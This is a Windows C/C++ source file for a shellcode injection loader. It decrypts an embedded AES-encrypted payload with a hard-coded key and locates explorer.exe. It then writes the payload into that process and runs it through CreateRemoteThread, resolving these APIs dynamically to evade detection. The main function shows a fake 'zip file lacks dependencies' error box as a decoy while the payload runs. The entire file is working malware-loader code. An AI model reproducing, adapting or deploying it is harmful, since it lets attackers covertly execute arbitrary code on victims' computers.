#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32.lib")
#include <psapi.h>
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Kernel32.lib")
#include "myAPI.h"
typedef LPVOID (WINAPI* ptrVirtualAllocExFunc)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* WriteProcessMemoryFunc)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef HANDLE (WINAPI* CreateRemoteThreadFunc)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

char encryption_key[] = { 0x74, 0x66, 0x72, 0x67, 0x79, 0x75, 0x68, 0x6a, 0x69, 0x6b, 0x6f, 0x6e, 0x6d, 0x62, 0x76, 0x63 };

unsigned char shellcodePayload[] = { 0x1a, 0xa6, 0xc7, 0xeb, 0x96, 0x7b, 0x06, 0xd8, 0x97, 0xa9, 0x89, 0xdc, 0x86, 0xac, 0xdc, 0x73, 0x0f, 0x9a, 0x89, 0xde, 0x7a, 0xc0, 0xdc, 0xac, 0x14, 0x87, 0xd9, 0x42, 0xa7, 0x85, 0xb5, 0x33, 0xe8, 0xf6, 0x42, 0x98, 0x6b, 0x39, 0x8b, 0x72, 0x7d, 0x50, 0x87, 0x29, 0x7d, 0x1d, 0xd5, 0x33, 0xb6, 0xf9, 0x68, 0xc6, 0xad, 0x0e, 0x79, 0xfe, 0xc9, 0x42, 0x39, 0x3d, 0x95, 0xa0, 0x30, 0x68, 0xba, 0xd4, 0x7c, 0x09, 0x65, 0x7b, 0x8b, 0xca, 0xb8, 0xe1, 0x98, 0x36, 0x78, 0xb1, 0xea, 0x2d, 0x73, 0xbf, 0x99, 0x8f, 0xf6, 0xa2, 0x4a, 0x5a, 0x5a, 0x5b, 0x63, 0x5d, 0x38, 0x5a, 0x66, 0xbb, 0xc1, 0xff, 0xa1, 0xe6, 0xba, 0xcc, 0xdd, 0x72, 0xe2, 0xac, 0xd3, 0xc0, 0x77, 0xe9, 0x21, 0xfa, 0xf2, 0xed, 0x17, 0x05, 0xc0, 0xd4, 0x69, 0xcd, 0x6d, 0x97, 0xa6, 0xc0, 0x84, 0xed, 0xf5, 0x79, 0x5c, 0x50, 0x74, 0xe5, 0x6c, 0xa0, 0x50, 0x49, 0xf9, 0x04, 0xd2, 0x98, 0x70, 0xfe, 0x35, 0xf3, 0x72, 0xe1, 0xa5, 0x52, 0xe0, 0x2e, 0xb1, 0x9e, 0x93, 0xda, 0xe5, 0xe6, 0xdf, 0xa8, 0x58, 0x52, 0x5b, 0xcd, 0x2d, 0x04, 0x74, 0xc0, 0x63, 0xe7, 0x66, 0x78, 0xf8, 0x28, 0xa5, 0x79, 0x25, 0x3b, 0xc6, 0xfe, 0xb2, 0x5d, 0x72, 0x35, 0x61, 0x8b, 0xc3, 0xa5, 0x07, 0x9c, 0xfb, 0xc1, 0x4b, 0x00, 0x16, 0x74, 0xf2, 0x27, 0xcb, 0x3b, 0x0d, 0xc4, 0x91, 0x90, 0x24, 0x82, 0x2b, 0xfa, 0xc2, 0x82, 0x25, 0x21, 0xb3, 0x51, 0x5c, 0x7d, 0xd6, 0xd4, 0x31, 0xfe, 0x0e, 0x74, 0x8b, 0xfc, 0x6c, 0x3c, 0xa0, 0xdc, 0x81, 0x50, 0xd5, 0x09, 0xcb, 0xe3, 0x02, 0x70, 0xaf, 0x84, 0x32, 0x2e, 0xda, 0x4f, 0x69, 0xf2, 0xc9, 0xec, 0xf5, 0xfc, 0x62, 0xd7, 0x23, 0xdf, 0xa3, 0x37, 0xbf, 0x1d, 0x49, 0xcd, 0xa8, 0x10, 0x8e, 0x41, 0xdf, 0x79, 0xa0, 0x69, 0xcb, 0xd9, 0xb8, 0x02, 0xd8, 0x32, 0x7d, 0x5b, 0xe9, 0xbf, 0xbd, 0xbb, 0x01, 0xf3, 0x7c, 0xf4, 0x22, 0xa6, 0x68, 0xf1, 0xc8, 0x5b, 0x59, 0xb0 };

unsigned int lengthOfShellcodePayload = sizeof(shellcodePayload);


int Daes(char * shellcodePayload, unsigned int lengthOfShellcodePayload, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);            
        CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey);
        CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, reinterpret_cast<BYTE*>(shellcodePayload), reinterpret_cast<DWORD*>(&lengthOfShellcodePayload));
          
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int SearchForProcess(const char *processName) {

        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
                CloseHandle(hSnapshotOfProcesses);
                return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
                if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
                        pid = processStruct.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshotOfProcesses);
              
        return pid;
}


int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {

        LPVOID pRemoteProcAllocMem = NULL;
        HANDLE hThread = NULL;
		
 		ptrVirtualAllocExFunc pVirtualAllocEx;
		WriteProcessMemoryFunc pWriteProcessMemory;
		CreateRemoteThreadFunc pCreateRemoteThread;

                char valloc[]="VirtualAllocEx";
                char wpmem[]="WriteProcessMemory";
                char crthread[]="CreateRemoteThread";                

		pVirtualAllocEx = (ptrVirtualAllocExFunc)myGetProcAddress(myGetModuleHandle(L"KERNEL32.dll"), valloc);
		pWriteProcessMemory = (WriteProcessMemoryFunc)myGetProcAddress(myGetModuleHandle(L"KERNEL32.dll"), wpmem);
		pCreateRemoteThread = (CreateRemoteThreadFunc)myGetProcAddress(myGetModuleHandle(L"KERNEL32.dll"), crthread);

		printf("\nFunction Pointers:\n");
		printf("VirtualAllocEx: 0x%p\n", pVirtualAllocEx);
		printf("WriteProcessMemory: 0x%p\n", pWriteProcessMemory);
		printf("CreateRemoteThread: 0x%p\n", pCreateRemoteThread);	
		
		printf("\nyou entered into shellcodeInjection section:\n\n");
  
		pRemoteProcAllocMem = pVirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
		printf("%-20s : 0x%-016p\n", "payload addr", (void *)shellcodePayload);
		printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)pRemoteProcAllocMem);
		
		printf("\n[1] Press Enter to Decrypt XOR Payload\n");
		getchar();	
		
		Daes((char *)shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));

		pWriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
		
		hThread = pCreateRemoteThread(hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pRemoteProcAllocMem), NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProcess = NULL;
	
	MessageBox(NULL, "This zip file lacks dependencies to decompress. Try others!", "Error x 0080976", MB_ICONERROR);
	
	pid = SearchForProcess("explorer.exe");
	if (pid) {
		printf("explorer.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProcess == NULL) {
			DWORD error = GetLastError();
			printf("Failed to open process. Error code: %lu\n", error);
			return 1; // You might want to handle the error appropriately
		}

		if (hProcess != NULL) {
			ShellcodeInject(hProcess, shellcodePayload, lengthOfShellcodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
}
